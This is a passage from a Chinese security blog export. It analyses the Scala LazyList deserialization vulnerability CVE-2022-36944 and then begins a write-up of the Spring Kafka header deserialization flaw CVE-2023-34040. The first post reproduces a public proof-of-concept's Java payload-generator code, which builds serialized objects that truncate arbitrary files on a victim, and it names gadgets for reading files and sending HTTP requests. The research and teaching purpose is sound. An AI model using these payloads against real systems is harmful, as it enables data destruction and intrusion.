<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SerialVersionUID</span>(<span class="number">3</span>L)</span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyList</span>[+<span class="type">A</span>] <span class="title">private</span>(<span class="params">private[this] var lazyState: (</span>) <span class="title">=&gt;</span> <span class="title">LazyList</span>.<span class="title">State</span>[<span class="type">A</span>])</span></span><br><span class="line">  <span class="keyword">extends</span> <span class="type">AbstractSeq</span>[<span class="type">A</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">LinearSeq</span>[<span class="type">A</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">LinearSeqOps</span>[<span class="type">A</span>, <span class="type">LazyList</span>, <span class="type">LazyList</span>[<span class="type">A</span>]]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">IterableFactoryDefaults</span>[<span class="type">A</span>, <span class="type">LazyList</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">Serializable</span> &#123;</span><br><span class="line">  <span class="keyword">import</span> <span class="type">LazyList</span>._</span><br><span class="line"></span><br><span class="line">  <span class="meta">@volatile</span> <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">var</span> stateEvaluated: <span class="type">Boolean</span> = <span class="literal">false</span></span><br><span class="line">  <span class="meta">@inline</span> <span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">stateDefined</span></span>: <span class="type">Boolean</span> = stateEvaluated</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">var</span> midEvaluation = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">lazy</span> <span class="keyword">val</span> state: <span class="type">State</span>[<span class="type">A</span>] = &#123;</span><br><span class="line">    <span class="comment">// if it&#x27;s already mid-evaluation, we&#x27;re stuck in an infinite</span></span><br><span class="line">    <span class="comment">// self-referential loop (also it&#x27;s empty)</span></span><br><span class="line">    <span class="keyword">if</span> (midEvaluation) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">RuntimeException</span>(<span class="string">&quot;self-referential LazyList or a derivation thereof has no more elements&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    midEvaluation = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">val</span> res = <span class="keyword">try</span> lazyState() <span class="keyword">finally</span> midEvaluation = <span class="literal">false</span></span><br><span class="line">    <span class="comment">// if we set it to `true` before evaluating, we may infinite loop</span></span><br><span class="line">    <span class="comment">// if something expects `state` to already be evaluated</span></span><br><span class="line">    stateEvaluated = <span class="literal">true</span></span><br><span class="line">    lazyState = <span class="literal">null</span> <span class="comment">// allow GC</span></span><br><span class="line">    res</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么，如果在创建<code>LazyList</code>对象时给其传任意一个无参匿名函数，岂不是可已实现任意无参匿名函数调用。  </p>
<h3 id="LazyList反序列化漏洞利用"><a href="#LazyList反序列化漏洞利用" class="headerlink" title="LazyList反序列化漏洞利用"></a>LazyList反序列化漏洞利用</h3><p>在知道了漏洞的成因后，如何寻找可利用的匿名函数是个难点。github中流传着该漏洞的POC。<a href="https://github.com/yarocher/lazylist-cve-poc/tree/main#/">CVE-2022-36944 POC</a><br>对该<code>POC</code>代码进行分析，入口点为  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> poc.cve.lazylist.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> poc.cve.lazylist.function0.DefaultProviders;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">   <span class="comment">// 这是一个进行任意文件擦除的例子</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      <span class="comment">// 要被擦除的文件路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileToTruncate</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// 是否进行追加</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">append</span> <span class="operator">=</span> Boolean.parseBoolean(args[<span class="number">1</span>]);</span><br><span class="line">      <span class="comment">// 创建Payload生成器对象</span></span><br><span class="line">        <span class="type">PayloadGenerator</span> <span class="variable">payloadGenerator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LazyList</span>(DefaultProviders.FILE_OUTPUT);</span><br><span class="line">        <span class="comment">// 生成Payload</span></span><br><span class="line">        <span class="type">byte</span>[] payload = payloadGenerator.generatePayload(fileToTruncate, append);</span><br><span class="line"></span><br><span class="line">        System.out.write(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在创建<code>payloadGenerator</code>对象时使用的<code>DefaultProviders.FILE_OUTPUT</code>是一个<code>Function</code>对象  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Function&lt;Object[], Function0&lt;Object&gt;&gt; FILE_OUTPUT = DefaultProviders::fileOutput;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * When invoked, instantiates new FileOutputStream(String fileName, boolean append) with controlled parameters is</span></span><br><span class="line"><span class="comment">     * called. If append is false, right after creating, specified file is truncated (written with 0). Which means you can</span></span><br><span class="line"><span class="comment">     * truncate any file on victim&#x27;s machine which victim has write access to.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args args[0]: String, file name to truncate; args[1]: boolean, whether to append or overwrite.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Function0 instance which can overwrite any file with zero when Object apply() is invoked</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Function0&lt;Object&gt; <span class="title function_">fileOutput</span><span class="params">(Object[] args)</span> &#123;</span><br><span class="line">      <span class="comment">// 文件路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileToTruncate</span> <span class="operator">=</span> (String) args[<span class="number">0</span>];</span><br><span class="line">      <span class="comment">// 是否追加</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">append</span> <span class="operator">=</span> (Boolean) args[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 通过反射的方式获得scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3 类的实例</span></span><br><span class="line">        <span class="comment">// 之所以通过反射的方式获取因为ProcessBuilderImpl被private修饰</span></span><br><span class="line">        <span class="keyword">return</span> ReflectionUtil.newInstance(<span class="string">&quot;scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; ProcessBuilder$.class, File.class, <span class="type">boolean</span>.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">File</span>(fileToTruncate), append&#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>generatePayload</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LAZY_LIST_CLASSNAME</span> <span class="operator">=</span> <span class="string">&quot;scala.collection.immutable.LazyList&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] generatePayload(Object... args) &#123;</span><br><span class="line">   <span class="comment">// 构造无参匿名函数</span></span><br><span class="line">   Function0&lt;Object&gt; function0 = function0Provider.apply(args);</span><br><span class="line">   <span class="comment">// 创建LazyList</span></span><br><span class="line">   <span class="type">Object</span> <span class="variable">lazyList</span> <span class="operator">=</span> createLazyList(function0);</span><br><span class="line">   <span class="comment">// 模拟writeReplace方法</span></span><br><span class="line">   <span class="type">Object</span> <span class="variable">serializationProxy</span> <span class="operator">=</span> ReflectionUtil.newInstance(<span class="string">&quot;scala.collection.immutable.LazyList$SerializationProxy&quot;</span>,</span><br><span class="line">            lazyList);</span><br><span class="line">   <span class="comment">// 序列化</span></span><br><span class="line">   <span class="keyword">return</span>  SerdeUtil.serialize(serializationProxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>function0Provider</code> 即前面传入的<code>FILE_OUTPUT</code>，通过调用其注入器方法<code>apply</code>显式的构造一个<code>Function0</code>类型的对象，然后将该对象传入到<code>createLazyList</code>创建一个<code>LazyList</code>对象，最终使用<code>SerializationProxy</code>进行包装（参考<code>LazyList writerePlace</code>方法）最终将该对象序列化。<br>在调用<code>createLazyList</code> 创建<code>LazyList</code>对象时首先通过反射的方式创建了<code>LazyList对</code>象，然后设置了其三个属性。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">createLazyList</span><span class="params">(Function0&lt;Object&gt; function0)</span> &#123;</span><br><span class="line">         <span class="comment">// 创建LazyList对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">lazyList</span> <span class="operator">=</span> ReflectionUtil.newInstance(LAZY_LIST_CLASSNAME, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Function0.class&#125;, function0);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">emptyLazyListState</span> <span class="operator">=</span> ReflectionUtil.getStaticField(<span class="string">&quot;scala.collection.immutable.LazyList$State$Empty$&quot;</span>, <span class="string">&quot;MODULE$&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置Empty对象类型的state，以便反序列化能够结束</span></span><br><span class="line">        ReflectionUtil.setField(lazyList, <span class="string">&quot;scala$collection$immutable$LazyList$$state&quot;</span>, emptyLazyListState);</span><br><span class="line">        <span class="comment">// 设置stateEvaluated 在进行KonwnonEmpty检查时确保进入到isEmpty方法中</span></span><br><span class="line">        ReflectionUtil.setField(lazyList, <span class="string">&quot;scala$collection$immutable$LazyList$$stateEvaluated&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 避免序列化过程中在本地触发Payload</span></span><br><span class="line">        ReflectionUtil.setField(lazyList, <span class="string">&quot;bitmap$0&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> lazyList;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在<code>POC</code>中除了提供<code>scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</code>外，还提供了另外两个可使用的匿名函数  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可进行文件读取</span></span><br><span class="line">scala.sys.process.ProcessBuilderImpl$FileInput$$anonfun$$lessinit$greater$<span class="number">2</span></span><br><span class="line"><span class="comment">// 可发起http请求</span></span><br><span class="line">scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>那么在<code>Scala</code>源码中着三个匿名函数来自哪里。<br>在创建<code>Scala</code>匿名函数时，若没有显式地为这些函数命名，那么<code>Scala</code>编译器将自动为这些函数分配一个名称，这些名称的格式为<code>$anonfunc$1</code>，其中<code>$anonfunc</code>表示着是匿名函数，<code>$1</code>为编号用以区分不同的匿名函数。<br>了解了这一点我们尝试对<code>scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</code>进行解析。<br><code>ProcessBuilderImpl</code>为特质，而<code>FileOutput</code>是其内部类，<code>anonfun</code>标识了匿名函数，<code>$lessinit$greater</code>标识了名称，<code>$3</code>标识了匿名函数的编号。将<code>$lessinit$greater</code>翻译一下就是<code>&lt;init&gt;</code>。这与前文提到的匿名函数通用格式有所区别，<code>Payload</code>使用的匿名函数多了<code>$lessinit$greater</code>标志。<br>在<code>Scala</code> 源码中 我们找到了<code>ProcessBuilderImpl</code>内部类<code>FileOutput</code>以及另外两个可用内部类的实现。  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>[process] <span class="class"><span class="keyword">class</span> <span class="title">URLInput</span>(<span class="params">url: <span class="type">URL</span></span>) <span class="keyword">extends</span> <span class="title">IStreamBuilder</span>(<span class="params">url.openStream(</span>), <span class="title">url</span>.<span class="title">toString</span>)</span></span><br><span class="line"><span class="keyword">private</span>[process] <span class="class"><span class="keyword">class</span> <span class="title">FileInput</span>(<span class="params">file: <span class="type">File</span></span>) <span class="keyword">extends</span> <span class="title">IStreamBuilder</span>(<span class="params">new <span class="type">FileInputStream</span>(file</span>), <span class="title">file</span>.<span class="title">getAbsolutePath</span>)</span></span><br><span class="line"><span class="keyword">private</span>[process] <span class="class"><span class="keyword">class</span> <span class="title">FileOutput</span>(<span class="params">file: <span class="type">File</span>, append: <span class="type">Boolean</span></span>) <span class="keyword">extends</span> <span class="title">OStreamBuilder</span>(<span class="params">new <span class="type">FileOutputStream</span>(file, append</span>), <span class="title">file</span>.<span class="title">getAbsolutePath</span>)</span></span><br></pre></td></tr></table></figure>
<p>在这里，注意到这三个类除了定义了主构造函数外便在没有定义其他的内容了，那么<code>Payload</code>中的匿名函数从哪里来。<br>通过观察上述三个函数的声明形式，可以注意到以下特征  </p>
<ul>
<li>均继承了一个父类  </li>
<li>在父类的主构造函数中调用了子类参数的方法</li>
</ul>
<p>跟进IStreamBuilder类，还可以发现该类的第一个参数为传名调用  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>[process] <span class="class"><span class="keyword">class</span> <span class="title">IStreamBuilder</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="class">  stream: =&gt; <span class="type">InputStream</span>, <span class="comment">// =&gt; 标识了传名调用</span></span></span></span><br><span class="line"><span class="params"><span class="class">  label: <span class="type">String</span></span></span></span><br><span class="line"><span class="params"><span class="class"></span>) <span class="keyword">extends</span> <span class="title">ThreadBuilder</span>(<span class="params">label, _ processOutput protect(stream</span>)) </span>&#123;</span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">hasExitValue</span> </span>= <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过模拟上述形式得到以下代码  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span>(<span class="params">i: =&gt; <span class="type">Int</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>(<span class="params">s: <span class="type">String</span></span>) <span class="keyword">extends</span> <span class="title">Parent</span>(<span class="params">s.length(</span>))</span></span><br></pre></td></tr></table></figure>
<p>通过<code>IDEA</code>进行编译后查看生成的类发现确实生成了<code>Son$$anonfun$$lessinit$greater$1</code><br><img src="/archives/2a377379/image-7.png" alt="alt text"><br>通过<code>javap</code>命令查看该类的字节码  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 前文提到的，匿名函数入口在apply方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">apply</span><span class="params">()</span>;</span><br><span class="line">    descriptor: ()I</span><br><span class="line">    flags: ACC_PUBLIC, ACC_FINAL</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">1</span>, locals=<span class="number">1</span>, args_size=<span class="number">1</span></span><br><span class="line">         <span class="number">0</span>: aload_0</span><br><span class="line">         <span class="comment">// 调用常量值中 23号索引指向的MethodRef 即apply$mcI$sp:()I</span></span><br><span class="line">         <span class="number">1</span>: invokevirtual #<span class="number">23</span>                 <span class="comment">// Method apply$mcI$sp:()I</span></span><br><span class="line">         <span class="number">4</span>: ireturn</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">7</span>: <span class="number">0</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>       <span class="number">5</span>     <span class="number">0</span>  <span class="built_in">this</span>   Lorg/example/Son$$anonfun$$lessinit$greater$<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> apply$mcI$sp();</span><br><span class="line">    descriptor: ()I</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">1</span>, locals=<span class="number">1</span>, args_size=<span class="number">1</span></span><br><span class="line">         <span class="comment">// 将当前方法的第一个参数放到操作数栈顶，即this</span></span><br><span class="line">         <span class="number">0</span>: aload_0</span><br><span class="line">         <span class="comment">// 用以获取常量池中 27号索引所指向的FieldRef的值，并放入操作数栈顶</span></span><br><span class="line">         <span class="number">1</span>: getfield      #<span class="number">27</span>                 <span class="comment">// Field s$1:Ljava/lang/String;</span></span><br><span class="line">         <span class="comment">// 调用常量池中 32号索引指向的Methodref 即 java/lang/String.length:()I</span></span><br><span class="line">         <span class="number">4</span>: invokevirtual #<span class="number">32</span>                 <span class="comment">// Method java/lang/String.length:()I</span></span><br><span class="line">         <span class="comment">// 返回执行的结果</span></span><br><span class="line">         <span class="number">7</span>: ireturn</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">7</span>: <span class="number">0</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>       <span class="number">8</span>     <span class="number">0</span>  <span class="built_in">this</span>   Lorg/example/Son$$anonfun$$lessinit$greater$<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>通过分析发现，<code>Son$$anonfun$$lessinit$greater$1</code>即是<code>Parent</code>类的第一个参数<code>s.length()</code>的引用，同理可知在<code>FileOutput</code> 中 <code>scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</code> 即<code>new FileOutputStream(file, append)</code>的引用。故POC中在创建<code>scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</code>对象时传入了两个参数<code>new File(fileToTruncate), append</code></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://docs.scala-lang.org/#/">Scala Document</a></li>
<li><a href="https://www.freebuf.com/vuls/347146.html#/">Apache Spark UI 命令注入漏洞 CVE-2022-33891
</a></li>
<li><a href="https://github.com/apache/spark/blob/v3.3.1/core/src/main/scala/org/apache/spark/ui/HttpSecurityFilter.scala">Apache Spark UI HttpSecurityFilter 源代码</a></li>
<li><a href="https://www.freebuf.com/articles/network/375109.html#/">基于LazyList的Scala反序列化漏洞透析(CVE-2022-36944)
</a></li>
<li><a href="https://github.com/yarocher/lazylist-cve-poc/tree/main#/">CVE-2022-36944 POC</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞原理</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>漏洞原理</tag>
        <tag>Scala</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Kafka 消息头反序列化漏洞（CVE-2023-34040）</title>
    <url>/archives/6725ab5c.html</url>
    <content><![CDATA[<h1 id="Spring-Kafka消息头反序列化漏洞（CVE-2023-34040）"><a href="#Spring-Kafka消息头反序列化漏洞（CVE-2023-34040）" class="headerlink" title="Spring Kafka消息头反序列化漏洞（CVE-2023-34040）"></a>Spring Kafka消息头反序列化漏洞（CVE-2023-34040）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>Spring for Apache Kafka (Spring - Kafka)项目将Spring的核心概念应用于基于Kafka的消息传递解决方案的开发。它提供了一个“template”作为发送消息的高级抽象。它还支持带有@KafkaListener注解和“listener container”的消息驱动POJOs 。这些库提倡使用依赖注入和声明式的使用方式。所有这些例子都与Spring框架的JMS支持和Spring AMQP对RabbitMQ的支持有相似之处。</p>
<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>当Kafka应用服务器允许一个不受信任的源的生产消息的时候，若其能够控制消息的headers，则可能导致一个反序列化漏洞的发生。</p>
<span id="more"></span>

<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><ul>
<li>2.8.1 to 2.9.10</li>
<li>3.0.0 to 3.0.9</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入相关依赖包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.arliya<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>SpringKafkaTest<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>SpringKafkaTest<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>SpringKafkaTest<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-kafka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;version&gt;2.9.11&lt;/version&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.projectlombok/lombok --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里使用spring-boot-starter-parent版本为2.6.14，其依赖的Spring Kafka版本为2.8.11，为存在漏洞版本；</p>
<p>为了对比，修改Spring Kafka的版本为2.9.11，为不受修复版本。</p>
<p>为了能够进行漏洞复现，我们需要编写一部分代码</p>
<p><img src="/archives/6725ab5c/image-20230825134125955.png" alt="image-20230825134125955"></p>
<p>测试代码主要包括Kafka的生产者于消费者的配置，一个生产消息的Web接口控制器，一个消费消息的Service，关于Spring Kafka的使用方式，可以参考该文章：</p>
<p><a href="https://juejin.cn/post/7207411012479074364">https://juejin.cn/post/7207411012479074364</a></p>
<p>两外，还需要搭建Apache Kafka服务器，建议使用Docker一键搭建，具体方式可以参考以下文章：</p>
<p><a href="https://juejin.cn/post/6960820341631352868">https://juejin.cn/post/6960820341631352868</a></p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在进行漏洞复现前，需要有一些于<code>Apache Kafka</code>相关的基础知识。</p>
<p><code>Kafka</code> 是一种分布式的，基于发布 &#x2F; 订阅的消息系统。Kafka包含一些基本概念，如生产者、消费者</p>
<ul>
<li>生产者：负责消息的产生，并推送到Kafka服务器</li>
<li>消费者：负责消息的消费</li>
</ul>
<p><code>Kafka</code>的一条消息有一些更精细的组件，包括<code>Key</code>、<code>Value</code>、<code>Headers</code>。</p>
<ul>
<li>Key：当一条消息被定义了Key之后，Kafka Server通过消息Key的hash，将相同Key的消息映射到同一个分区中。</li>
<li>Value：数据</li>
<li>Headers：存储消息元数据，headers内容可以自行定义，类似于HTTP协议中的自定义消息头，当然Kafka中也有一些内部的消息头，该漏洞就与消息头有关</li>
</ul>
<p>关于<code>Kafka</code>的基础概念还有很多，但对于该漏洞来说，能够理解上述概念已经足够了。若需要深入了解<code>Kafka</code>可以参考这篇文章：</p>
<p><a href="https://zhuanlan.zhihu.com/p/74063251">https://zhuanlan.zhihu.com/p/74063251</a></p>
<p>我们还是从官方的通告入手：</p>
<p><a href="https://spring.io/security/cve-2023-34040">https://spring.io/security/cve-2023-34040</a></p>
<p><img src="/archives/6725ab5c/image-20230825135600387.png" alt="image-20230825135600387"></p>
<p>漏洞描述中提示了一些关键信息：</p>
<ul>
<li>存在漏洞的版本为<code>3.x.0 &lt;= version &lt;= 3.0.9   2.x.0 &lt;= 2.9.10</code>，也就是说<code>3.0.10</code>版本是修复版本。</li>
<li>当<code>Spring Kafka Consumer</code>没有配置<code>ErrorHandlingDeserializer </code>的时候存在漏洞</li>
<li>当<code>checkDeserExWhenKeyNull  </code>或者<code>checkDeserExWhenValueNull </code>被设置为<code>True</code>时存在漏洞</li>
<li>当攻击者可以生产消息</li>
<li>当上述三个条件同时满足时可能存在漏洞</li>
<li>攻击发生在程序反序列化<code>Record Headers</code>的时候</li>
<li>使用了<code>ErrorHandlingDeserializer </code>可以避免漏洞，因为它会删除危险的记录头。</li>
</ul>
<p>首先，我们到官方仓库找到最新发布的漏洞修复版本<code>v3.0.10</code>：</p>
<p><img src="/archives/6725ab5c/image-20230825140318666.png" alt="image-20230825140318666"></p>
<p>更新日志提示了可能的漏洞修复记录</p>
